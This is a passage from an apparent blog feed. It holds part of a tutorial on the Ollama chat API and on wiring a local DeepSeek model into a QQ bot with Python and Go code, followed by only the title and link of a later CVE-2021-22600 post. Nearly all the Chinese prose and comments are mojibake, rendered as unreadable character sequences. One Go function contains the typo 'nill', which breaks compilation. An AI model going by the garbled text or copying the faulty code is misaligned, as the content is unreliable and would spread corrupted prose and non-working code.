&quot;prompt&quot;:&quot;æˆ‘æ˜¯ä¸çœŸï¼Œæˆ‘é˜¿å¦ˆæ¯å¤©æ—©ä¸Šèµ·æ¥ç»™æˆ‘å……ç‘å…‹äº”ä»£&quot;<br>&#125;&#x27;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° Ollama çš„å›ç­”éƒ½æ˜¯å‰²è£‚æˆå¥½å¤šæ¡çš„ï¼š</p><p><img src="https://s2.loli.net/2025/07/02/nZgSXMLAbRmlOeu.png"></p><p>å…¶å›å¤é€šå¸¸éµå¾ªå¦‚ä¸‹æ ¼å¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># æœªç»“æŸï¼Œä¼šå›å¤å¤šä¸ªå¦‚ä¸‹ json</span><br>&#123;<br>    <span class="hljs-string">&quot;model&quot;</span>:<span class="hljs-string">&quot;æ¨¡å‹å&quot;</span>,<br>    <span class="hljs-string">&quot;created_at&quot;</span>:<span class="hljs-string">&quot;ç”Ÿæˆæ—¶é—´&quot;</span>,<br>    <span class="hljs-string">&quot;response&quot;</span>:<span class="hljs-string">&quot;å•ä¸ª token&quot;</span>,<br>    <span class="hljs-string">&quot;done&quot;</span>:false <span class="hljs-comment"># æ˜¯å¦ç»ˆæ­¢</span><br>&#125;<br><br><span class="hljs-comment"># å·²ç»“æŸï¼Œä¼šå›å¤å•ä¸ªå¦‚ä¸‹ json</span><br>&#123;<br>    <span class="hljs-string">&quot;model&quot;</span>:<span class="hljs-string">&quot;æ¨¡å‹å&quot;</span>,<br>    <span class="hljs-string">&quot;created_at&quot;</span>:<span class="hljs-string">&quot;ç”Ÿæˆæ—¶é—´&quot;</span>,<br>    <span class="hljs-string">&quot;response&quot;</span>:<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-comment"># ä¸€å®šä¸ºç©ºå­—ç¬¦ä¸²</span><br>    <span class="hljs-string">&quot;done_reason&quot;</span>:<span class="hljs-string">&quot;stop&quot;</span>, <span class="hljs-comment"># ç»ˆæ­¢åŸå› </span><br>    <span class="hljs-string">&quot;done&quot;</span>:true, <span class="hljs-comment"># æ˜¯å¦ç»ˆæ­¢</span><br>    <span class="hljs-comment"># å‰©ä¸‹è¿™äº›å‚æ•°ğŸ‘´å°±ä¸å†™æ³¨é‡Šäº†</span><br>    <span class="hljs-string">&quot;context&quot;</span>:[ <br>        <span class="hljs-comment"># æœ‰å¾ˆå¤šæ•°å­—çš„æ•°ç»„</span><br>    ],<br>    <span class="hljs-string">&quot;total_duration&quot;</span>: æ•°å­—,<br>    <span class="hljs-string">&quot;load_duration&quot;</span>:æ•°å­—,<br>    <span class="hljs-string">&quot;prompt_eval_count&quot;</span>:æ•°å­—,<br>    <span class="hljs-string">&quot;prompt_eval_duration&quot;</span>:æ•°å­—,<br>    <span class="hljs-string">&quot;eval_count&quot;</span>:æ•°å­—,<br>    <span class="hljs-string">&quot;eval_duration&quot;</span>:æ•°å­—<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="é€šè¿‡-api-chat-ä½¿ç”¨-ChatML-æ ¼å¼è¿›è¡Œäº¤äº’"><a href="#é€šè¿‡-api-chat-ä½¿ç”¨-ChatML-æ ¼å¼è¿›è¡Œäº¤äº’" class="headerlink" title="é€šè¿‡ &#x2F;api&#x2F;chat ä½¿ç”¨ ChatML æ ¼å¼è¿›è¡Œäº¤äº’"></a>é€šè¿‡ &#x2F;api&#x2F;chat ä½¿ç”¨ ChatML æ ¼å¼è¿›è¡Œäº¤äº’</h2><h3 id="åŸºæœ¬å¯¹è¯"><a href="#åŸºæœ¬å¯¹è¯" class="headerlink" title="åŸºæœ¬å¯¹è¯"></a>åŸºæœ¬å¯¹è¯</h3><p><code>/api/chat</code> æ˜¯æœ€å¸¸ç”¨çš„äº¤äº’æ¥å£ï¼Œé€šå¸¸æˆ‘ä»¬åº”å½“ä¼ é€’å…¥ä»¥ä¸‹æ ¼å¼çš„ JSON æ•°æ®ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;model&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;æ¨¡å‹å&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;messages&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-comment">/* ç¬¦åˆ OpenAI æ ¼å¼çš„æ¶ˆæ¯ä¸Šä¸‹æ–‡ */</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>å…¶ä¸­ <code>&quot;messages&quot;</code> å‚æ•°æˆ‘ä»¬éœ€è¦ä¼ å…¥ç¬¦åˆ OpenAI æ ¼å¼çš„æ¶ˆæ¯ä¸Šä¸‹æ–‡ï¼Œå³ <a href="https://github.com/openai/openai-python/blob/release-v0.28.0/chatml.md">ChatML</a> ï¼ˆChat Message Languageï¼‰ ï¼Œè¯¥æ ¼å¼è™½ç„¶ç”± OpenAI åˆ¶å®šï¼Œä½†å·²ç»æˆä¸ºç›®å‰äº‹å®ä¸Šçš„å¯¹è¯å¤§æ¨¡å‹æ ‡å‡†ï¼Œå…¶åŸºæœ¬ç»“æ„åº”å½“ä¸ºå¦‚ä¸‹æ ¼å¼çš„æ•°ç»„ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">[<br>    &#123;<br>        <span class="hljs-string">&quot;role&quot;</span> : <span class="hljs-string">&quot;è§’è‰²&quot;</span>,<br>        <span class="hljs-string">&quot;content&quot;</span> : <span class="hljs-string">&quot;æ¶ˆæ¯&quot;</span><br>    &#125;<br>]<br></code></pre></td></tr></table></figure><p>å„å­—æ®µè¯´æ˜å¦‚ä¸‹ï¼š</p><ul><li><code>&quot;role&quot;</code> ï¼šè¯¥å­—æ®µç”¨ä»¥è¡¨ç¤ºå¯¹è¯çš„è§’è‰²ï¼Œå¯é€‰é¡¹æœ‰ï¼š<ul><li><code>&quot;system&quot;</code> ï¼šç³»ç»Ÿæ¶ˆæ¯ï¼Œç”¨ä»¥è®¾å®šå¯¹è¯çš„åˆå§‹èƒŒæ™¯</li><li><code>&quot;user&quot;</code> ï¼šç”¨æˆ·è¾“å…¥çš„æ¶ˆæ¯ï¼Œè¡¨ç¤ºç”¨æˆ·çš„æé—®</li><li><code>&quot;assistant&quot;</code> ï¼šåŠ©æ‰‹å›ç­”çš„æ¶ˆæ¯ï¼Œè¡¨ç¤ºæ¨¡å‹ç”Ÿæˆçš„å›å¤</li></ul></li><li><code>&quot;content&quot;</code> ï¼šè¯¥å­—æ®µç”¨ä»¥è¡¨ç¤ºè§’è‰²æ‰€è¯´çš„å†…å®¹</li></ul><p>ä¾‹å¦‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªåˆæ³•çš„è¯·æ±‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<br>    <span class="hljs-string">&quot;model&quot;</span>: <span class="hljs-string">&quot;deepseek-r1:7b&quot;</span>,<br>    <span class="hljs-string">&quot;messages&quot;</span> : [<br>        &#123;<br>            <span class="hljs-string">&quot;role&quot;</span> : <span class="hljs-string">&quot;system&quot;</span>,<br>            <span class="hljs-string">&quot;content&quot;</span> : <span class="hljs-string">&quot;ä½ æ˜¯æ¸¸æˆä¸»æ’­ç”µæ£ï¼Œä½ ç°åœ¨æ­£åœ¨è¿›è¡Œç›´æ’­ï¼Œå¹¶é’ˆå¯¹è§‚ä¼—çš„å¼¹å¹•è¿›è¡Œå›å¤ï¼Œä½ çš„å›ç­”åº”å½“ç¬¦åˆä»–çš„ç›´æ’­é£æ ¼&quot;</span><br>        &#125;,<br>        &#123;<br>            <span class="hljs-string">&quot;role&quot;</span> : <span class="hljs-string">&quot;user&quot;</span>,<br>            <span class="hljs-string">&quot;content&quot;</span> : <span class="hljs-string">&quot;ä½ æ˜¯èŒä¸šé€‰æ‰‹å—&quot;</span><br>        &#125;<br>    ]<br>&#125;<br></code></pre></td></tr></table></figure><p>è€Œ ollama çš„è¿”å›æ ¼å¼é€šå¸¸éµå¾ªå¦‚ä¸‹æ ¼å¼ï¼Œæ¯æ¬¡å›å¤ä¸€ä¸ª json ç›´åˆ°ç»ˆæ­¢ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># æœªç»“æŸï¼Œä¼šå›å¤å¤šä¸ªå¦‚ä¸‹ json</span><br>&#123;<br>    <span class="hljs-string">&quot;model&quot;</span>:<span class="hljs-string">&quot;æ¨¡å‹å&quot;</span>,<br>    <span class="hljs-string">&quot;created_at&quot;</span>:<span class="hljs-string">&quot;ç”Ÿæˆæ—¶é—´&quot;</span>,<br>    <span class="hljs-string">&quot;message&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;role&quot;</span>:<span class="hljs-string">&quot;assistant&quot;</span>,<br>        <span class="hljs-string">&quot;content&quot;</span>:<span class="hljs-string">&quot;å•ä¸ª token&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;done&quot;</span>:false <span class="hljs-comment"># æ˜¯å¦ç»ˆæ­¢</span><br>&#125;<br><br><span class="hljs-comment"># å·²ç»“æŸï¼Œä¼šå›å¤å•ä¸ªå¦‚ä¸‹ json</span><br>&#123;<br>    <span class="hljs-string">&quot;model&quot;</span>:<span class="hljs-string">&quot;æ¨¡å‹å&quot;</span>,<br>    <span class="hljs-string">&quot;created_at&quot;</span>:<span class="hljs-string">&quot;ç”Ÿæˆæ—¶é—´&quot;</span>,<br>    <span class="hljs-string">&quot;message&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;role&quot;</span>:<span class="hljs-string">&quot;assistant&quot;</span>,<br>        <span class="hljs-string">&quot;content&quot;</span>:<span class="hljs-string">&quot;&quot;</span> <span class="hljs-comment"># ä¸€å®šä¸ºç©ºå­—ç¬¦ä¸²</span><br>    &#125;,<br>    <span class="hljs-string">&quot;done_reason&quot;</span>:<span class="hljs-string">&quot;stop&quot;</span>, <span class="hljs-comment"># ç»ˆæ­¢åŸå› </span><br>    <span class="hljs-string">&quot;done&quot;</span>:true, <span class="hljs-comment"># æ˜¯å¦ç»ˆæ­¢</span><br>    <span class="hljs-comment"># å‰©ä¸‹è¿™äº›å‚æ•°ğŸ‘´å°±ä¸å†™æ³¨é‡Šäº†</span><br>    <span class="hljs-string">&quot;total_duration&quot;</span>: æ•°å­—,<br>    <span class="hljs-string">&quot;load_duration&quot;</span>:æ•°å­—,<br>    <span class="hljs-string">&quot;prompt_eval_count&quot;</span>:æ•°å­—,<br>    <span class="hljs-string">&quot;prompt_eval_duration&quot;</span>:æ•°å­—,<br>    <span class="hljs-string">&quot;eval_count&quot;</span>:æ•°å­—,<br>    <span class="hljs-string">&quot;eval_duration&quot;</span>:æ•°å­—<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ curl ç¼–å†™è¯·æ±‚è¿˜æ˜¯å¤ªç²—ç³™äº†ï¼Œé€šå¸¸æˆ‘ä»¬è¿˜æ˜¯å¾—å°†ä¸æ¨¡å‹é—´çš„äº¤äº’æ•´åˆåˆ°å®é™…åº”ç”¨å½“ä¸­ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªç®€æ˜“çš„ Python ç¤ºä¾‹ç¨‹åºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    req_data = &#123;<br>        <span class="hljs-string">&quot;model&quot;</span>: <span class="hljs-string">&quot;deepseek-r1:7b&quot;</span>,<br>        <span class="hljs-string">&quot;messages&quot;</span> : [<br>            &#123;<br>                <span class="hljs-string">&quot;role&quot;</span> : <span class="hljs-string">&quot;system&quot;</span>,<br>                <span class="hljs-string">&quot;content&quot;</span> : <span class="hljs-string">&quot;ä½ æ˜¯æ¸¸æˆä¸»æ’­ç”µæ£ï¼Œä½ ç°åœ¨æ­£åœ¨è¿›è¡Œç›´æ’­ï¼Œå¹¶é’ˆå¯¹è§‚ä¼—çš„å¼¹å¹•è¿›è¡Œå›å¤ï¼Œä½ çš„å›ç­”åº”å½“ç¬¦åˆä»–çš„ç›´æ’­é£æ ¼&quot;</span><br>            &#125;,<br>            &#123;<br>                <span class="hljs-string">&quot;role&quot;</span> : <span class="hljs-string">&quot;user&quot;</span>,<br>                <span class="hljs-string">&quot;content&quot;</span> : <span class="hljs-string">&quot;ä½ æ˜¯èŒä¸šé€‰æ‰‹å—&quot;</span><br>            &#125;<br>        ]<br>    &#125;<br>    req_url = <span class="hljs-string">&#x27;http://localhost:11434/api/chat&#x27;</span><br><br>    reply = requests.post(req_url, data = json.dumps(req_data)).text.split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    reply_msg = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> reply:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(i) == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">continue</span><br>        msg = json.loads(i)<br>        reply_msg += msg[<span class="hljs-string">&#x27;message&#x27;</span>][<span class="hljs-string">&#x27;content&#x27;</span>]<br><br>    <span class="hljs-built_in">print</span>(reply_msg)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p>å› ä¸ºæ¨¡å‹çš„å›ç­”æ–­æ–­ç»­ç»­çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ Python è„šæœ¬é‡Œæ‹¼äº†ä¸€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ° Deepseek æ¨¡å‹åœ¨å›å¤ä¸­è¿˜ä¼šå¸¦æœ‰æ€è€ƒè¿‡ç¨‹ï¼š</p><p><img src="https://s2.loli.net/2025/07/02/8COldZnPxqy6krj.png" alt="ç”µæ£æƒ¨é­å¼€é™¤å‡ºèŒä¸šé€‰æ‰‹ç±"></p><h2 id="Example-å°†-Ollama-æ¥å…¥-QQ-bot"><a href="#Example-å°†-Ollama-æ¥å…¥-QQ-bot" class="headerlink" title="Example. å°† Ollama æ¥å…¥ QQ bot"></a>Example. å°† Ollama æ¥å…¥ QQ bot</h2><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨åŸºäº <a href="https://github.com/arttnba3/Shigure-Bot">Shigure-Bot</a> è¿™ä¸€ Bot SDK å¼€å‘çš„ Bot åº”ç”¨ <a href="https://github.com/arttnba3/Shione">Shione</a> æ„å»ºä¸€ä¸ªç”¨äºèŠå¤©çš„æ’ä»¶ï¼ŒBot åç«¯ä½¿ç”¨å…¼å®¹ <a href="https://github.com/botuniverse/onebot-11/">OneBot 11 API</a> çš„å¼€æº NT QQ Protocol çš„å®ç° <a href="https://github.com/LagrangeDev/Lagrange.Core">Lagrange.Core</a> ï¼Œå¦‚ä½•ä¸è¿™äº›æ¡†æ¶è¿›è¡Œå¯¹æ¥ä»¥åŠå…·ä½“ä½¿ç”¨æ–¹å¼ç•™ç»™è¯»è€…è¯¾åè‡ªè¡Œé˜…è¯»æ–‡æ¡£äº†ï¼ˆç¬‘</p><p>é¦–å…ˆç¼–å†™ä¸€ä¸ªæ ¸å¿ƒå‡½æ•°ç”¨ä»¥å¤„ç†æ¨¡å‹çš„å›å¤æ¶ˆæ¯ï¼Œè¿™é‡Œç¬”è€…é¢å¤–æ·»åŠ äº†ä¸€ä¸ªåœ¨ä½¿ç”¨ Deepseek æ—¶æŠŠæ€è€ƒè¿‡ç¨‹åˆ å»çš„è¿‡ç¨‹ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ParseOLLAMAReply</span><span class="hljs-params">(rawReplyMsg []<span class="hljs-type">byte</span>)</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">var</span> respMsg <span class="hljs-type">string</span><br><br><span class="hljs-comment">// original OLLAMA produce a list</span><br>respJsonDataList := bytes.Split(rawReplyMsg, []<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;\n&quot;</span>))<br><span class="hljs-keyword">for</span> _, respJsonData := <span class="hljs-keyword">range</span> respJsonDataList &#123;<br>respJson := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;)<br>err := json.Unmarshal(respJsonData, &amp;respJson)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, errors.New(fmt.Sprintf(<span class="hljs-string">&quot;Error parsing reply: %v, original reply data:\n%v&quot;</span>, err.Error(), respJsonData))<br>&#125;<br><br><span class="hljs-keyword">if</span> respJson[<span class="hljs-string">&quot;done&quot;</span>].(<span class="hljs-type">bool</span>) &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br><br>respMsg += respJson[<span class="hljs-string">&quot;message&quot;</span>].(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;)[<span class="hljs-string">&quot;content&quot;</span>].(<span class="hljs-type">string</span>)<br>&#125;<br><br><span class="hljs-comment">// DeepSeek model will always output this, but we do not need...</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(respMsg) &gt; <span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;&lt;think&gt;&quot;</span>) &amp;&amp; respMsg[:<span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;&lt;think&gt;&quot;</span>)] == <span class="hljs-string">&quot;&lt;think&gt;&quot;</span> &#123;<br>splitRes := strings.Split(respMsg, <span class="hljs-string">&quot;&lt;/think&gt;\n&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(splitRes) &gt; <span class="hljs-number">1</span> &#123;<br>respMsg = splitRes[<span class="hljs-number">1</span>]<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> respMsg, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯æ¶ˆæ¯è¯·æ±‚å‡½æ•°ï¼Œæˆ‘ä»¬å°†è¯·æ±‚ç›´æ¥å‘ç»™å¯¹åº”è·¯å¾„å³å¯ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">RequestModel</span><span class="hljs-params">(provider <span class="hljs-type">string</span>, url <span class="hljs-type">string</span>, model <span class="hljs-type">string</span>, headers <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;, maxWaitingTime time.Duration, messages <span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> ([]<span class="hljs-type">byte</span>, <span class="hljs-type">error</span>) &#123;<br>    reqData := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;)<br>reqData[<span class="hljs-string">&quot;model&quot;</span>] = model<br>reqData[<span class="hljs-string">&quot;messages&quot;</span>] = messages<br><br>reqBodyJson, err := json.Marshal(reqData)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br>req, err := http.NewRequest(<span class="hljs-string">&quot;POST&quot;</span>, url, bytes.NewBuffer(reqBodyJson))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br>req.Header.Set(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/json&quot;</span>)<br><span class="hljs-keyword">if</span> headers != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">for</span> k, v := <span class="hljs-keyword">range</span> headers &#123;<br>req.Header.Set(k, v.(<span class="hljs-type">string</span>))<br>&#125;<br>&#125;<br><br>client := &amp;http.Client&#123;<br>Timeout: maxWaitingTime,<br>&#125;<br>resp, err := client.Do(req)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br><span class="hljs-keyword">defer</span> resp.Body.Close()<br>    <br>    <span class="hljs-keyword">if</span> resp.StatusCode != <span class="hljs-number">200</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, errors.New(<span class="hljs-string">&quot;Response status code is &quot;</span> + strconv.Itoa(resp.StatusCode))<br>&#125;<br><br>respBody, err := io.ReadAll(resp.Body)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>    <br>    <span class="hljs-keyword">return</span> respBody, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ä¹‹ååœ¨ä¸Šé¢å†å¥—ä¸€å±‚ï¼Œå…¶æ ¹æ®ä¸åŒçš„ä¾›åº”å•†é€‰æ‹©è°ƒç”¨ä¸åŒçš„æ¶ˆæ¯å¤„ç†å‡½æ•°ï¼Œè¿™é‡Œæˆ‘ä»¬åªæœ‰ Ollama æ‰€ä»¥åªéœ€è¦è°ƒç”¨å‰é¢å†™çš„ <code>ParseOllamaReply</code>ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ChatWithAI</span><span class="hljs-params">(provider <span class="hljs-type">string</span>, url <span class="hljs-type">string</span>, model <span class="hljs-type">string</span>, prompt <span class="hljs-type">string</span>, headers <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;, maxWaitingTime time.Duration, messages <span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">var</span> respMsg <span class="hljs-type">string</span><br>    <br>    respBody, err := RequestModel(provider, url, model, headers, maxWaitingTime, messages)<br>    <span class="hljs-keyword">if</span> err != nill &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err<br>    &#125;<br><br><span class="hljs-keyword">switch</span> provider &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;Ollama&quot;</span>:<br>respMsg, err = ParseOLLAMAReply(respBody)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err<br>&#125;<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, errors.New(<span class="hljs-string">&quot;Unknown provider: &quot;</span> + provider)<br>&#125;<br><br><span class="hljs-keyword">return</span> respMsg, <span class="hljs-literal">nil</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>ä¹‹åå¯ä»¥è‡ªå·±é¢„å…ˆæ„ç­‘ä¸€ä¸ªæƒ³è¦çš„ä¸Šä¸‹æ–‡ä½œä¸ºè¾“å…¥æ¥æ„é€ ä¸€ä¸ªè‡ªå·±æƒ³è¦çš„ bot äººæ ¼ï¼Œä¸‹é¢ç®€å•æµ‹è¯•ä¸€ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2025/07/03/8GlJm7Obg5wrMdt.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ç¾Šé©¼ï¼šä¼šè€…ä¸éš¾&lt;/p&gt;</summary>
    
    
    
    <category term="OPS" scheme="https://arttnba3.github.io/categories/OPS/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="è¿ç»´" scheme="https://arttnba3.github.io/tags/%E8%BF%90%E7%BB%B4/"/>
    
    <category term="DeepSeek" scheme="https://arttnba3.github.io/tags/DeepSeek/"/>
    
    <category term="Ollama" scheme="https://arttnba3.github.io/tags/Ollama/"/>
    
  </entry>
  
  <entry>
    <title>ã€CVE.0x0Dã€‘CVE-2021-22600 æ¼æ´åˆ†æåŠåˆ©ç”¨</title>
    <link href="https://arttnba3.github.io/2025/04/30/CVE-0X0D-CVE-2021-22600/"/>
    <id>https://arttnba3.github.io/2025/04/30/CVE-0X0D-CVE-2021-22600/</id>
    <published>2025-04-30T08:59:05.000Z</published>
